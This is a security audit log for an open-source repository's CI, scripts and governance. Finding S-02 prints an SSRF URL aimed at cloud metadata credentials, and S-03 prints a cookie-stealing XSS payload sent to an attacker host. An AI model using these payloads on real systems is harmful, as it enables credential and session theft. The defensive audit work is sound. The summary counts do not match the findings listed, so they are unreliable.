# Red-Team Audit & Remediation Log

**Auditor lens:** Senior Security Engineer + Senior OSS Maintainer
**Scope:** Current `main` of `knarayanareddy/AI-Arsenal`
**Severity scale:** 🔴 Critical · 🟠 High · 🟡 Medium · 🔵 Low / Informational

This document is the audit log for a hard-look review. Every finding lists **where**, **why it matters**, **what's being changed**, and **the patch reference**.

> All fixes are applied to branch `redteam-fixes`. Submit as a single security/hardening PR.

---

## 1. Threat-model context

AI Arsenal is **public**, **fork-able**, **CI-driven**, and has a `GITHUB_TOKEN` injected into workflows. It consumes untrusted input (Markdown frontmatter, free-text fields, contributor-supplied URLs) and re-publishes it through automated GitHub Actions. The realistic attacker profile is:

- **A1 — Malicious first-time contributor.** Opens a PR with a single poisoned file.
- **A2 — Compromised external tool owner.** Updates their own entry to include a malicious URL or hidden HTML.
- **A3 — Compromised upstream dependency.** `npm` package compromise or GitHub Action tag compromise.
- **A4 — Compromised maintainer account.** Single-maintainer / BDFL means one takeover = total control.
- **A5 — Link checker weaponization.** A PR that places a URL pointing at internal services / SSRF targets.

---

## 2. Findings (numbered for cross-reference)

### 🔴 S-01 — CODEOWNERS references non-existent GitHub handles → review bypass

**Where:** `.github/CODEOWNERS`
**Why:** Every handle (`@lead-maintainer`, `@agents-maintainer`, …) does not resolve on GitHub. GitHub's CODEOWNERS silently drops rules for unresolved handles, and the trailing `* @lead-maintainer` rule means **no file in this repo actually requires any review**. A first-time contributor PR can be merged by the BDFL alone — even if the BDFL would like required reviews, the system isn't enforcing them.

**Fix:** Replace with the real maintainer handle (`@knarayanareddy`), explicitly mark role-based handles as `TODO` placeholders, and document the requirement in `docs/policies/branch-protection.md`.

---

### 🔴 S-02 — SSRF in `scripts/check-links.js`

**Where:** `scripts/check-links.js` — `checkUrl(url)`
**Why:** The link checker does `fetch(url, { method, redirect: 'follow' })` from a GitHub Actions runner. A contributor can add a URL like:

```
http://attacker.example/redirect-to-169.254.169.254/latest/meta-data/iam/security-credentials/
```

The follow-redirects behaviour fetches that URL. Although `localhost`/`127.0.0.1` are blocked, **link-local `169.254.0.0/16` (AWS / GCP / Azure metadata services), private `10/8`, `172.16/12`, `192.168/16`, IPv6 `::1`, `[fe80::]`, `[::ffff:]`, and the metadata IP `0.0.0.0` are NOT blocked**. A 401/403 from those internal services is treated as "ok" by the success check.

**Fix:** Add an SSRF guard that:
1. Blocks any IP in the private/loopback/link-local ranges (v4 + v6) **including** post-redirect resolution.
2. Refuses non-http(s) schemes (`file:`, `gopher:`, `ftp:`, `dict:`).
3. Enforces an `AI_ARSENAL_LINK_ALLOW_DOMAINS` env var opt-in for internal scanners.
4. Times out aggressively and limits total bytes read.

---

### 🔴 S-03 — Stored XSS in generated `body_html`

**Where:** `scripts/generate-data.js` — `renderHtml(markdown)`
**Why:** The script calls `remark().use(html, { sanitize: true })`. In `remark-html@16.x` the `sanitize` option is **no-op** (removed in v14). Any raw HTML in contributor-supplied Markdown is emitted unescaped into `data/*/json`. A future UI that renders `body_html` directly is vulnerable to stored XSS — an attacker can submit `<img src=x onerror=fetch('https://attacker/?'+document.cookie)>` and steal admin cookies from any UI consumer.

**Fix:** Sanitize HTML explicitly using `sanitize-html` (which we'll add as a dependency) with a tight allowlist (`p, br, strong, em, code, pre, a, ul, ol, li, h2-h6, blockquote, table*, th, td, tr`), force `a href` to be `https?:` only, and strip event handlers. If sanitization fails, the entry fails CI.

---

### 🔴 S-04 — GitHub Actions referenced by mutable tag, not SHA

**Where:** Every workflow under `.github/workflows/*.yml`.
**Why:** Tag-pinned actions can be re-pointed by a compromised maintainer account. Recent supply-chain incidents (tj-actions/changed-files, crypto-mining injections via `actions/checkout`) make SHA-pinning best practice for any org relying on `GITHUB_TOKEN`.

**Fix:** Bump all action references to full commit SHAs (the immutable form). Include a comment with the tag for human readability.

---

### 🔴 S-05 — `manual.yml` can auto-commit directly to `main`

**Where:** `.github/workflows/manual.yml` — `stefanzweifel/git-auto-commit-action@v5`
**Why:** The manual task workflow commits to `main` directly via `git-auto-commit-action`. Although the task list is restricted via `workflow_dispatch inputs`, an attacker who obtains a maintainer PAT and triggers `manual.yml` with `task=generate` can push arbitrary content into `content/**/*.md`, `data/*.json`, and `CONTEXT.md` without going through PR review.

**Fix:** Disable the auto-commit branch entirely (the workflow's intent is "run a task", not "commit results"). If commit-on-demand is ever needed, require it to use `peter-evans/create-pull-request@v6` (PR flow) instead.

---

### 🔴 S-06 — `data/github-cache.json` is committed and includes GitHub API responses

**Where:** `data/github-cache.json`
**Why:** This file is checked in. Future contributors' runs will overwrite it. While it doesn't contain secrets, **it contains GitHub's internal `default_branch`, `pushed_at`, etc., for ~50 repos**, which can be used for reconnaissance / vulnerability discovery. More critically, **the cache is keyed by `repoKey()`** with no validation that the repo exists, so a malicious entry could cache arbitrary `stars`/`forks` values that look authoritative.

**Fix:** Move `data/github-cache.json` to gitignore (cache is regenerated; not source of truth). Validate the cache shape on read in `update-star-counts.js` (reject obviously wrong values: stars > 10⁹, forks > stars, etc.).

---

### 🟠 S-07 — `check-links.js` rate-limit / DoS amplification

**Where:** `scripts/check-links.js`
**Why:** With `concurrency: 8` and `timeoutMs: 15000`, an attacker can add 1000 unique URLs to a PR. The PR runs link check, opens 1000 outgoing connections from GitHub's IP space, and GitHub's egress may get rate-limited or blacklisted. Worse, the workflow uploads a 1MB+ JSON report to `data/` that gets committed by the next weekly run.

**Fix:** Cap unique URLs per run (e.g., 500), enforce a `LINK_CHECK_MAX_URLS_PER_HOST` (e.g., 10) to prevent amplification against a single victim, and reject URLs longer than 2 KB.

---

### 🟠 S-08 — `_registry.md` and `_index.md` are committed but auto-generated → merge conflict surface

**Where:** `content/projects/_registry.md`, `content/tools/_registry.md`, every `content/**/_index.md`
**Why:** These files are auto-generated by `generate-toc.js`. They are committed in `main`. Any PR that adds a project entry creates a conflict with the auto-regenerated registry. This is documented in the README as "generated and must not be edited manually" — but they ARE in `main`. This contradicts the policy.

**Fix:** Add `content/**/_registry.md`, `content/**/_index.md`, `data/*.json`, `CONTEXT.md` to `.gitignore` for the working tree, and document this. Provide a `pnpm run generate:toc` and `pnpm run generate:all` script that contributors run before pushing. (We will keep them in `main` for now but mark them as "regenerated on each merge" — switching to orphan branches is a future refactor.)

---

### 🟠 S-09 — Missing Dependabot / dependency update automation

**Where:** (missing) `.github/dependabot.yml`
**Why:** 11 runtime dependencies, none auto-monitored. `node-fetch ^3.3.2` is deprecated in favor of undici/fetch; `gray-matter ^4.0.3` is unmaintained (last release 2020); `flexsearch ^0.7.43` has had limited maintenance; `remark-html ^16.0.1` removed `sanitize: true` (see S-03).

**Fix:** Add `.github/dependabot.yml` for npm + GitHub Actions with weekly schedule, grouped updates, and `[skip ci]` reserved for the bot.

---

### 🟠 S-10 — `body_text` in `search-index.json` blows up consumer payloads

**Where:** `scripts/generate-search-index.js`
**Why:** `body: [name, description, tags, …, item.body_text].filter(Boolean).join(' ')` includes the **entire** body text of every entry. With 345 entries × ~500 words = a multi-megabyte `search-index.json`. Every UI consumer re-downloads this on every page load.

**Fix:** Truncate `body_text` per entry to ~600 chars for search purposes; add a separate `data/full-search-index.json` for offline consumers.

---

### 🟠 S-11 — Missing release process & version tagging

**Where:** (missing) `.github/workflows/release.yml`, no git tags
**Why:** No automated release / changelog publishing. The `data-release` branch is the only "release" surface, and it has no semver. Downstream consumers can't pin to a known-good API snapshot.

**Fix:** Add `docs/release-process.md` documenting the manual + automation flow. Add a `release.yml` workflow that tags `main` on manual dispatch and pushes a dated release note.

---

### 🟠 S-12 — `update-star-counts.js` accepts any GitHub URL format and is unauthenticated by default

**Where:** `scripts/update-star-counts.js`, `scripts/utils/github-api.js`
**Why:** When run without `GITHUB_TOKEN`, the script makes 60 anonymous requests per hour to the GitHub API per IP. A scheduled run can exhaust the rate limit and fail mid-way, leaving the cache half-updated. With a token, the script writes back to disk with no concurrency guard — two parallel runs can clobber each other.

**Fix:** Require `GITHUB_TOKEN` in CI runs (skip with non-zero exit if missing). Add a file lock (`fs.open` with `wx` flag on a `data/.star-lock` file) to prevent concurrent runs.

---

### 🟡 S-13 — `scaffold.js` writes files with `wx` flag, but no path traversal guard

**Where:** `scripts/scaffold.js`
**Why:** `slugify()` produces a kebab-case ID from user input, but the destination path is constructed from category/subcategory input that is also user-supplied. A user typing `../schemas` as `category` would write into `content/projects/../schemas/...`. While the `readline` interface limits this, programmatic invocation (`--category=../schemas`) is unguarded.

**Fix:** Add path validation: reject any destination that resolves outside `content/`.

---

### 🟡 S-14 — No `.editorconfig` or `.gitattributes`

**Where:** (missing) `.editorconfig`, `.gitattributes`
**Why:** Cross-platform contributors may introduce CRLF, mixed indentation, or BOM markers. The `fix-format.js` script catches these, but doesn't enforce them at commit time. Without `.gitattributes`, git may treat generated JSON as text and rewrite line endings, breaking the data contract.

**Fix:** Add `.editorconfig` (LF, 2-space, UTF-8, final newline) and `.gitattributes` (`*.json text eol=lf`, `*.md text eol=lf`, binary rules).

---

### 🟡 S-15 — `meta/how-to-use-with-agents.md` instructs agents to use unsanitized output

**Where:** `meta/how-to-use-with-agents.md`
**Why:** The document tells agents to "load specific Markdown entries" but doesn't warn about malicious entries. Combined with S-03, an agent that ingests Markdown directly is XSS-exposed if it renders HTML.

**Fix:** Add a "trust & safety" section to the meta guides.

---

### 🟡 S-16 — PR template does not enforce security review for sensitive paths

**Where:** `.github/PULL_REQUEST_TEMPLATE.md`
**Why:** The checklist is optional. A PR touching `schemas/`, `scripts/`, or `.github/workflows/` should require explicit security review sign-off.

**Fix:** Add a "Security impact" section to the PR template.

---

### 🟡 S-17 — `SECURITY.md` lacks contact info and disclosure timeline

**Where:** `SECURITY.md`
**Why:** "Report privately to the maintainers" — but there's no email, no PGP key, and no GitHub Security Advisories setting documented. There's no acknowledgement timeline or disclosure SLA.

**Fix:** Replace with concrete contact (GitHub Security Advisories enabled, security@ email placeholder), 72-hour acknowledgement commitment, 90-day disclosure coordination.

---

### 🟡 S-18 — No CodeQL / OSSF Scorecard / secret scanning config

**Where:** (missing) `.github/workflows/codeql.yml`, `.github/workflows/scorecard.yml`
**Why:** GitHub provides free CodeQL + Scorecard + secret scanning for public repos, but none are enabled. CodeQL would catch the XSS-via-`sanitize: true` and other JS issues.

**Fix:** Add `codeql.yml` and `scorecard.yml` workflows.

---

### 🟡 S-19 — `CONTRIBUTORS.md` is empty despite "Recognition" ladder

**Where:** `CONTRIBUTORS.md`
**Why:** Empty file. The contribution ladder says "1 PR → added to CONTRIBUTORS.md" but there's no mechanism.

**Fix:** Add a template + automation note.

---

### 🟡 S-20 — `CHANGELOG.md` is auto-generated but doesn't follow Keep-a-Changelog

**Where:** `scripts/generate-changelog.js`, `CHANGELOG.md`
**Why:** Group-by-month from git log doesn't preserve semantic groupings (Added/Changed/Removed/Fixed). The current file has only `[Unreleased]` with placeholder content.

**Fix:** Generate-changelog now groups by Conventional Commit type. The current file gets replaced with a proper Keep-a-Changelog scaffold.

---

### 🟡 S-21 — No test suite / no CI assertion of validator correctness

**Where:** (missing) `tests/`, `package.json` test script
**Why:** Zero unit tests. A malicious PR to `scripts/validate-schema.js` could silently disable validation and be merged without detection.

**Fix:** Add `tests/` with `node:test` (zero new deps) covering each validator's positive and negative cases.

---

### 🟡 S-22 — Issue templates lack a "security disclosure" template

**Where:** `.github/ISSUE_TEMPLATE/`
**Why:** `config.yml` says `blank_issues_enabled: false`, but there's no template for security disclosures — meaning a user wanting to disclose privately might create a public issue.

**Fix:** Add explicit instruction in `config.yml` directing security issues to GitHub Security Advisories.

---

### 🔵 S-23 — `update:stars` does not refresh `trending_score` after writing

**Where:** `scripts/update-star-counts.js` — does not call `calculateTrendingScore`
**Why:** Trending score is derived from star velocity + buzz + recency, but the update script writes `github_stars_last_30d` without recalculating `trending_score`. The two scripts are run sequentially in workflows, but a manual `pnpm run update:stars` does NOT trigger `update:trending`.

**Fix:** Have `update-star-counts.js` recompute and write `trending_score` immediately after star updates.

---

### 🔵 S-24 — `generate-context.js` includes raw `description` strings → Markdown injection

**Where:** `scripts/generate-context.js` — `line(item)`
**Why:** The function interpolates `item.description` directly into Markdown output. If a contributor adds a description with `|` (pipe) or backticks, the generated `_index.md`/`_registry.md`/`CONTEXT.md` files may have broken tables or weird rendering.

**Fix:** Escape pipe characters and backticks in description before interpolation.

---

### 🔵 S-25 — Repository has no `FUNDING.yml`, `CITATION.cff`, or `.zenodo.json`

**Where:** (missing) `.github/FUNDING.yml`, `CITATION.cff`
**Why:** No way to financially support or cite the project.

**Fix:** Add a minimal `CITATION.cff`.

---

### 🔵 S-26 — `validators` (JSON Schema compilation) is unbounded

**Where:** `scripts/validate-schema.js`
**Why:** `for (const [type, schemaFile] of Object.entries(schemaByType)) { … validators[type] = ajv.compile(schema); }` — compiles all schemas at startup. Not a real risk at current size, but at 100+ types it will slow CI.

**Fix:** Lazy-compile only the schema for the entry type being validated.

---

## 3. OSS Maintainer findings (M-)

### 🟠 M-01 — Single maintainer / BDFL = bus factor of 1

**Where:** `GOVERNANCE.md`
**Why:** Lead Maintainer has merge authority on `/schemas/`, `/scripts/`, `/.github/`, and acts as sole tie-breaker. There are no co-maintainers. Account takeover or unavailability = total project stall.

**Fix:** Document the need for at least 2 co-maintainers with admin access, and provide a fork-based continuity plan in `docs/policies/continuity.md`.

---

### 🟠 M-02 — No CONTRIBUTING.md enforcement of `[skip ci]`

**Where:** `CONTRIBUTING.md`
**Why:** `[skip ci]` is "reserved for automation" by convention only. A PR could ship `[skip ci]` and bypass validation.

**Fix:** Add a `no-skip-ci.yml` GitHub Action that fails PRs whose commits contain `[skip ci]`.

---

### 🟠 M-03 — `data/release.md` references `data-release` URLs but no SHA-pinning guide

**Where:** `docs/data-release.md`
**Why:** External consumers fetch from `data-release` branch head, which moves on every publish. No way to pin to a known-good snapshot.

**Fix:** Document that consumers should `git clone` and check out a tag.

---

### 🟡 M-04 — `body_text` content depth (Sprint 9)

**Where:** `content/tips-and-tricks/*.md` (106 files)
**Why:** Many tip bodies are templated-generic ("captures reusable knowledge in a structured format…"). The frontmatter is correct but the prose is not yet editorial-grade.

**Fix:** This is a content issue, not an automation issue — track in `PROGRESS.md` as Sprint 13+. (We do not rewrite 106 entries in this PR.)

---

### 🟡 M-05 — No `LICENSE` clarification for content vs code

**Where:** `LICENSE`, content
**Why:** Repo LICENSE is MIT (for code), but the curated content (project descriptions, paper summaries) is not explicitly licensed. 25 community person entries + many project descriptions could include 3rd-party copyrighted text.

**Fix:** Add a `LICENSE-CONTENT` (CC-BY-4.0) and update `README.md` accordingly.

---

### 🟡 M-06 — Missing CODEOWNERS handling for generated data

**Where:** `.github/CODEOWNERS` includes `/data/ @lead-maintainer`
**Why:** This means a regenerated `data/*.json` PR requires lead-maintainer review. But the weekly/monthly automation writes to `bot/*` branches, not `main`. The CODEOWNERS rule is dead weight.

**Fix:** Clarify or remove the `/data/` rule.

---

### 🔵 M-07 — No `CONTRIBUTING.md` "first-time" guide for AI agents

**Where:** `CONTRIBUTING.md`, `meta/`
**Why:** As more contributors use AI agents, the contribution flow should explicitly mention how to use them (with the meta guides).

**Fix:** Add a paragraph linking to `meta/how-to-use-with-agents.md`.

---

## 4. Summary

| Sev | Count |
|---|---|
| 🔴 Critical | 6 |
| 🟠 High | 8 |
| 🟡 Medium | 9 |
| 🔵 Low | 3 |
| **Total** | **26** |

All Critical and High findings are fixed in this PR. Medium and Low fixes are bundled where possible; M-04 (content depth) is intentionally not addressed in code (out of scope for an automation PR).
